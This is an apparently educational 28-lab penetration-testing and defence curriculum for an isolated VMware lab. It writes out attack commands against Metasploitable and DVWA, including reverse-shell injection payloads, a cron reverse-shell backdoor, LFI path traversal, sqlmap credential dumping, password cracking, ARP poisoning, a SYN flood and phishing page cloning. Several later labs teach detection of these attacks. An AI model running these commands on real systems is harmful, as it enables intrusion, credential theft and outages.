A Professional Cybersecurity Training Curriculum

The Complete Cyber Ops Lab

A 7-week, 28-lab journey designed for self-study and online teaching. Master the art of ethical hacking and cyber defense from the ground up.

Lab 1: The Virtual Lab

Objective: Build the virtual battlefield. A correctly configured lab is the bedrock of all cybersecurity practice.

Global Importance: Safe, isolated environments are essential for security research and skills development without risking real-world systems.

Key Concepts: Virtualization, network segmentation (LAN vs. DMZ), firewall roles.

Tools: VMware Workstation/Player

VMware Procedure
  1. pfSense VM: Adapters: Bridged (WAN), VMnet1 (LAN), VMnet2 (DMZ).
  2. Kali VM: Adapter: VMnet1 (LAN).
  3. Metasploitable & Wazuh VMs: Adapter: VMnet2 (DMZ).
  4. pfSense Config: Set static IPs for LAN (`192.168.100.1`) and DMZ (`192.168.200.1`).
  5. Verification: Kali gets a LAN IP. Set Metasploitable's IP to `192.168.200.10`. Confirm connectivity.

Outcome: All VMs online and communicating correctly.

Lab 2: Network Scanning

Objective: Discover live hosts, open ports, and running services to map the attack surface.

Global Importance: Reconnaissance is the first phase of any attack. Defenders use the same techniques to find and close security gaps.

Key Concepts: TCP 3-way handshake, Nmap scan types, service version detection.

Tools: Nmap

Beginner's Procedure
  1. Run a ping scan to find live hosts: `nmap -sn 192.168.100.0/24`.
  2. Run a comprehensive scan on the target: `nmap -sV -sC -p- -oX victim.xml 192.168.200.10`.
  3. Analyze the XML output to identify all open ports and services.

Outcome: A detailed map of the target's open ports and running services.

Lab 3: Web Enumeration

Objective: Actively query web services to find hidden directories, files, and potential vulnerabilities.

Global Importance: Web applications are a primary attack vector. Finding vulnerabilities here is critical for both attackers and defenders.

Key Concepts: HTTP response codes, web server configuration files (`robots.txt`), directory brute-forcing.

Tools: Nikto, Dirb

Beginner's Procedure
  1. Run Nikto for a baseline scan: `nikto -h http://192.168.200.10`.
  2. Use Dirb to find hidden directories: `dirb http://192.168.200.10`.
  3. Investigate interesting directories found (e.g., `/dvwa`, `/mutillidae`).

Outcome: A list of potential web vulnerabilities and hidden content locations.

Lab 4: SMB Enumeration

Objective: Query the SMB service to find network shares, user accounts, and system information.

Global Importance: Misconfigured SMB services can lead to massive data leaks and are a common entry point for ransomware.

Key Concepts: Server Message Block (SMB) protocol, null sessions, share permissions.

Tools: enum4linux

Beginner's Procedure
  1. Run a full enumeration scan: `enum4linux -a 192.168.200.10`.
  2. Note any user accounts, machine names, and accessible shares.
  3. Attempt to connect to an open share: `smbclient //192.168.200.10/tmp`.

Outcome: A list of system users and network shares, with potential anonymous access confirmed.

Lab 5: Metasploit Database

Objective: Learn to use the Metasploit database to store scan results and manage a penetration test.

Global Importance: Professional penetration tests require organized data management. The MSF database is a foundational tool for this.

Key Concepts: Workspace management, data import/export, querying hosts and services.

Tools: Metasploit Framework

Beginner's Procedure
  1. Start and initialize the database: `msfdb init`.
  2. Launch `msfconsole` and create a workspace: `workspace -a MyLab`.
  3. Import the Nmap scan from Lab 2: `db_import victim.xml`.
  4. Query the database: `hosts`, `services -p 21`.

Outcome: Nmap scan results are successfully imported and searchable within Metasploit.

Lab 6: Exploiting a Backdoor

Objective: Gain your first foothold using Metasploit to exploit a known software flaw for remote access.

Global Importance: Unpatched systems are a primary vector for breaches. This simulates exploiting public vulnerabilities (CVEs).

Key Concepts: Exploit, payload, shell, bind vs. reverse shell.

Tools: Metasploit Framework

Beginner's Procedure
  1. In `msfconsole`, search `search vsftpd 2.3.4`.
  2. Select the exploit: `use exploit/unix/ftp/vsftpd_234_backdoor`.
  3. Set the target: `set RHOSTS 192.168.200.10`.
  4. Launch the attack: `run`.

Outcome: A root command shell on the target machine.

Lab 7: Brute-Forcing Logins

Objective: Target administrative interfaces by using automated tools to guess weak credentials from a wordlist.

Global Importance: Weak and default passwords are one of the most common and damaging security failings.

Key Concepts: Dictionary attack, brute-force attack, rate limiting.

Tools: Hydra

Beginner's Procedure
  1. Find the Tomcat Manager login page (`http://192.168.200.10:8180`).
  2. Use Hydra to brute-force the password: `hydra -l tomcat -P /usr/share/wordlists/rockyou.txt 192.168.200.10 http-get /manager/html -s 8180`.
  3. Log in with the found credentials.

Outcome: Successful identification of the correct username and password.

Lab 8: Sniffing Credentials

Objective: Capture and analyze network traffic to sniff credentials sent over unencrypted protocols.

Global Importance: Highlights the critical danger of using insecure, clear-text protocols like FTP and Telnet.

Key Concepts: Network packets, MAC/IP addresses, encryption vs. clear-text.

Tools: Wireshark

Beginner's Procedure
  1. Launch Wireshark on Kali and start capturing on `eth0`.
  2. Connect to the target via telnet: `telnet 192.168.200.10`.
  3. Log in with `msfadmin`/`msfadmin`.
  4. Stop capture, filter for `telnet`, right-click a packet and `Follow > TCP Stream`.

Outcome: Wireshark clearly shows the captured username and password.

Lab 9: Intercepting with Burp

Objective: Use a web proxy to intercept, inspect, and modify traffic between your browser and a web server.

Global Importance: Web proxies are the single most important tool for professional web application security testing.

Key Concepts: HTTP/HTTPS, request/response cycle, client-side vs. server-side, proxying.

Tools: Burp Suite

Beginner's Procedure
  1. Launch Burp Suite and configure its built-in browser.
  2. Navigate to DVWA on the target machine.
  3. In Burp, go to the Proxy tab and turn Intercept on.
  4. Submit a form in the browser and observe the raw HTTP request in Burp.

Outcome: A captured HTTP request is visible and can be modified in Burp Suite.

Lab 10: SQL Injection

Objective: Manipulate a database behind a website to extract sensitive data by exploiting insecure code.

Global Importance: SQLi has been a top web vulnerability for over a decade, responsible for countless data breaches.

Key Concepts: SQL syntax, input sanitization, database enumeration.

Tools: sqlmap

Beginner's Procedure
  1. Navigate to the DVWA "SQL Injection" page and copy the URL.
  2. Run sqlmap: `sqlmap -u "URL" --cookie="DVWA_COOKIE" --dbs`.
  3. Enumerate tables: `... -D dvwa --tables`.
  4. Dump user credentials: `... -D dvwa -T users --dump`.

Outcome: The contents of the `users` table from the database are displayed on your terminal.

Lab 11: Command Injection

Objective: Trick a web application into executing arbitrary system commands on the server to get a shell.

Global Importance: A critical vulnerability that provides a direct path from a web flaw to full server compromise.

Key Concepts: Input validation, shell metacharacters (`;`, `|`, `&`), reverse shells.

Tools: Netcat

Beginner's Procedure
  1. Go to the DVWA "Command Injection" page.
  2. Test with `127.0.0.1; whoami`. You should see `www-data`.
  3. Start a listener on Kali: `nc -lvnp 4444`.
  4. Enter a reverse shell payload: `127.0.0.1; nc 192.168.100.10 4444 -e /bin/bash`.

Outcome: A shell session from the web server connects back to your Kali machine.

Lab 12: File Inclusion

Objective: Exploit a Local File Inclusion (LFI) vulnerability to read sensitive system files from the server.

Global Importance: LFI can expose source code, configuration files, and user credentials, leading to further compromise.

Key Concepts: Path traversal (`../`), server-side includes, log poisoning.

Tools: Web Browser

Beginner's Procedure
  1. Go to the DVWA "File Inclusion" page.
  2. Notice the URL has `?page=include.php`.
  3. Change the URL to `?page=../../../../etc/passwd`.
  4. The contents of the server's password file should display on the page.

Outcome: The contents of `/etc/passwd` from the web server are visible in your browser.

Lab 13: Password Cracking

Objective: Extract password hashes and use John the Ripper to crack them offline.

Global Importance: Even if attackers can't get clear-text passwords, cracking hashes is the next best thing for privilege escalation.

Key Concepts: Hashing vs. encryption, salt, wordlists, rule-based attacks.

Tools: John the Ripper

Beginner's Procedure
  1. Get a root shell on the target.
  2. Copy `/etc/passwd` and `/etc/shadow` to Kali.
  3. Combine them: `unshadow passwd.txt shadow.txt > hashes.txt`.
  4. Run John: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`.
  5. View cracked passwords: `john --show hashes.txt`.

Outcome: One or more user passwords are cracked and displayed.

Lab 14: Hashcat Cracking

Objective: Use Hashcat to leverage the power of a GPU for significantly faster password cracking.

Global Importance: GPU-based cracking is the industry standard. Hashcat is the tool of choice for professionals cracking complex passwords.

Key Concepts: CPU vs. GPU cracking, hash modes, attack masks.

Tools: Hashcat

Beginner's Procedure
  1. Use the `hashes.txt` file from the previous lab.
  2. Identify the hash type (e.g., SHA512crypt for modern Linux). Find the Hashcat mode number for it.
  3. Run Hashcat: `hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`.
  4. View cracked passwords in the `potfile`.

Outcome: Passwords are cracked much faster than with John, demonstrating the power of GPU acceleration.

Lab 15: Custom Wordlists

Objective: Create a custom, target-specific wordlist based on the content of its website for more effective password guessing.

Global Importance: Generic wordlists often fail. Targeted wordlists based on company/employee names drastically increase the success rate of password attacks.

Key Concepts: OSINT (Open Source Intelligence), web scraping, password psychology.

Tools: CeWL

Beginner's Procedure
  1. Run CeWL against the target website: `cewl http://192.168.200.10 -w custom_words.txt`.
  2. Examine the `custom_words.txt` file. It will contain words found on the site.
  3. Use this custom wordlist in a brute-force attack with Hydra (Lab 7) or a cracking attack with John/Hashcat.

Outcome: A new text file containing a targeted wordlist scraped from the victim's website.

Lab 16: Man-in-the-Middle

Objective: Intercept and potentially alter communication between two parties without their knowledge.

Global Importance: MITM attacks are a serious threat on public Wi-Fi and insecure corporate networks, leading to session hijacking and data theft.

Key Concepts: ARP protocol, ARP poisoning/spoofing, session hijacking.

Tools: Ettercap

Beginner's Procedure
  1. Enable IP forwarding on Kali: `echo 1 > /proc/sys/net/ipv4/ip_forward`.
  2. Launch Ettercap: `ettercap -G`.
  3. Scan for hosts, add the victim to Target 1 and the gateway (pfSense) to Target 2.
  4. Start ARP poisoning from the menu.

Outcome: Ettercap successfully poisons the ARP cache of the victim, and you can see their traffic.

Lab 17: Privilege Escalation

Objective: Go from a low-privilege user to full system control (root) by exploiting kernel vulnerabilities.

Global Importance: Gaining root/SYSTEM is often the ultimate goal of an attacker, giving them complete control over the machine.

Key Concepts: User privileges, kernel vs. user space, SUID bits.

Tools: Searchsploit

Beginner's Procedure
  1. Gain a low-privilege shell (e.g., as `www-data`).
  2. Get the kernel version: `uname -a`.
  3. On Kali, use `searchsploit` to find an exploit for that kernel.
  4. Transfer the exploit code to the target, compile it (`gcc exploit.c -o exploit`), and run `./exploit`.

Outcome: Your shell prompt changes from `$` to `#`, and `whoami` returns `root`.

Lab 18: Hash Dumping

Objective: Use post-exploitation tools like Meterpreter to directly extract password hashes from system memory.

Global Importance: This is a common technique used by attackers to harvest credentials for lateral movement without needing to crack them immediately.

Key Concepts: Meterpreter, post-exploitation modules, SAM database (Windows), shadow file (Linux).

Tools: Metasploit/Meterpreter

Beginner's Procedure
  1. Gain a Meterpreter session with root/SYSTEM privileges.
  2. Run the hashdump script: `run post/linux/gather/hashdump`.
  3. The user hashes from the `/etc/shadow` file will be displayed on your screen.
  4. Save these hashes for offline cracking (Lab 13/14).

Outcome: A list of all user password hashes is exfiltrated from the target.

Lab 19: Persistence

Objective: Create a backdoor or scheduled task to ensure you can regain access to the compromised machine after a reboot.

Global Importance: Attackers don't want to lose access. Persistence is key for long-term operations, data exfiltration, and Advanced Persistent Threats (APTs).

Key Concepts: Cron jobs (Linux), Scheduled Tasks (Windows), Run keys, services.

Tools: Metasploit, cron

Beginner's Procedure
  1. Gain a root shell on the target.
  2. Edit the crontab: `crontab -e`.
  3. Add a line to start a reverse shell back to you every minute: `* * * * * nc 192.168.100.10 4445 -e /bin/bash`.
  4. Start a listener on Kali (`nc -lvnp 4445`) and wait for the connection.

Outcome: After rebooting the victim, you automatically receive a shell connection back to your machine.

Lab 20: Pivoting

Objective: Use a compromised host to "pivot" and attack other machines on internal networks that are not directly accessible.

Global Importance: This simulates lateral movement within a corporate network, which is how attackers move from a low-value target to high-value assets like domain controllers.

Key Concepts: Routing, subnets, lateral movement, port forwarding.

Tools: Metasploit/Meterpreter

Beginner's Procedure
  1. Gain a Meterpreter shell.
  2. Run `ifconfig` in the shell to see internal network interfaces.
  3. Use `run autoroute -s [internal_subnet]` to route traffic through the victim.
  4. `background` the session and use a Metasploit scanner against the new internal IP range.

Outcome: Metasploit can successfully scan a network that is only accessible from the compromised host.

Lab 21: Deploying an IDS

Objective: Deploy a Network Intrusion Detection System (NIDS) to monitor network traffic for malicious activity.

Global Importance: IDS/IPS are critical network security controls for detecting and/or blocking common attacks at the perimeter.

Key Concepts: Signature-based vs. anomaly-based detection, promiscuous mode, IDS vs. IPS.

Tools: pfSense, Suricata

Beginner's Procedure
  1. In pfSense, install the Suricata package.
  2. Configure Suricata to listen on the DMZ interface.
  3. Enable the "ET Open" ruleset and apply changes.
  4. Generate some benign traffic (ping, browse web) and verify it passes without alerts.

Outcome: Suricata is installed, running, and monitoring traffic on the DMZ network.

Lab 22: Deploying a SIEM

Objective: Deploy a SIEM/XDR agent to an endpoint for log collection and host-based intrusion detection.

Global Importance: Modern security relies on endpoint visibility. SIEM/XDR platforms are the central brain for security operations centers (SOCs).

Key Concepts: SIEM, XDR, log aggregation, endpoint agent, HIDS vs. NIDS.

Tools: Wazuh

Beginner's Procedure
  1. In the Wazuh web GUI, go to Agents > Deploy New Agent.
  2. Select the correct OS and follow the on-screen command.
  3. Run the command on your Metasploitable machine to install the agent.
  4. Verify the agent connects and appears in the Wazuh dashboard.

Outcome: The Metasploitable VM appears as a connected agent in the Wazuh dashboard.

Lab 23: Detecting Attacks

Objective: Re-run previous attacks and observe the alerts they generate in Suricata and Wazuh.

Global Importance: This is the core loop of security operations: detecting, analyzing, and responding to threats identified by security tools.

Key Concepts: Alerting, rule correlation, false positives vs. false negatives.

Tools: Metasploit, Suricata, Wazuh

Beginner's Procedure
  1. Launch the vsftpd backdoor exploit (Lab 6) against the target.
  2. Check the Suricata alerts in pfSense. You should see alerts for a root shell.
  3. Launch a brute-force attack (Lab 7) against SSH.
  4. Check the Wazuh dashboard. You will see alerts for multiple failed logins.

Outcome: Malicious activity is successfully detected and generates alerts in both the NIDS and SIEM.

Lab 24: DoS & Detection

Objective: Launch a Denial of Service (DoS) attack to render a service unusable and detect it with the NIDS.

Global Importance: DoS/DDoS attacks are a major threat to online services, causing downtime and financial loss.

Key Concepts: TCP SYN flood, resource exhaustion, availability (from CIA triad).

Tools: Metasploit, Suricata

Beginner's Procedure
  1. In `msfconsole`, use `auxiliary/dos/tcp/synflood`.
  2. Set `RHOSTS` to `192.168.200.10` and `RPORT` to `21`.
  3. `run` the attack. Try to connect to FTP; it should fail.
  4. Check Suricata alerts in pfSense for SYN Flood attack signatures.

Outcome: The target service becomes unresponsive, and Suricata generates an alert for the DoS attack.

Lab 25: Social Engineering

Objective: Exploit the human element by cloning a login page to harvest credentials.

Global Importance: Phishing is the #1 vector for initial access in most breaches. Understanding it is crucial.

Key Concepts: Phishing, pretexting, credential harvesting.

Tools: Social-Engineer Toolkit (SET)

Beginner's Procedure
  1. Launch `setoolkit`.
  2. Choose `Social-Engineering` > `Website Attack` > `Credential Harvester` > `Site Cloner`.
  3. Enter your Kali IP and the URL to clone (e.g., `http://192.168.200.10`).
  4. On a victim machine, browse to your Kali IP and enter fake credentials.

Outcome: Credentials entered on the fake page are captured and displayed in your SET terminal.

Lab 26: Capstone Pt. 1

Objective: Perform a full penetration test from scratch, chaining multiple vulnerabilities to gain root access.

Global Importance: This simulates a real-world engagement, testing problem-solving and the ability to combine techniques.

Key Concepts: Attack chains, vulnerability correlation, critical thinking.

Tools: All previous tools

Beginner's Procedure
  1. Start with Nmap.
  2. Enumerate services to find a weak point (e.g., a web flaw).
  3. Gain an initial low-privilege shell.
  4. Find a privilege escalation vector on the machine to get root.
  5. Document every step with screenshots.

Outcome: Successful root access on the Metasploitable machine using a multi-step attack path.

Lab 27: Capstone Pt. 2

Objective: Analyze the logs and alerts in your defensive tools (Wazuh, Suricata) to trace the path of your own attack.

Global Importance: This "purple team" exercise (combining red and blue team skills) is invaluable for understanding the full security lifecycle.

Key Concepts: Incident response, log analysis, threat hunting.

Tools: Wazuh, Suricata

Beginner's Procedure
  1. In Wazuh, filter for events from the Metasploitable agent during your attack time.
  2. Look for login failures, command execution, and file modifications.
  3. In Suricata, look for alerts related to your initial exploit and any network scanning.
  4. Correlate the alerts to map out your attack chain.

Outcome: A timeline of your attack is constructed using only the defender's logs and alerts.

Lab 28: Reporting

Objective: Write a professional penetration test report detailing your findings, risk levels, and remediation advice.

Global Importance: The report is the final, most crucial deliverable of a security assessment. Communication skills are as important as technical skills.

Key Concepts: Executive summary, technical vulnerability details, risk rating (CVSS), remediation.

Tools: Word Processor (e.g., Google Docs, Word)

Beginner's Procedure
  1. Create a report with an executive summary (high-level overview).
  2. For each vulnerability found, describe it, explain the risk, and provide clear steps to reproduce it.
  3. Provide specific, actionable advice on how to fix each vulnerability.
  4. Proofread for clarity, grammar, and professionalism.

Outcome: A professional PDF report that could be presented to a client.
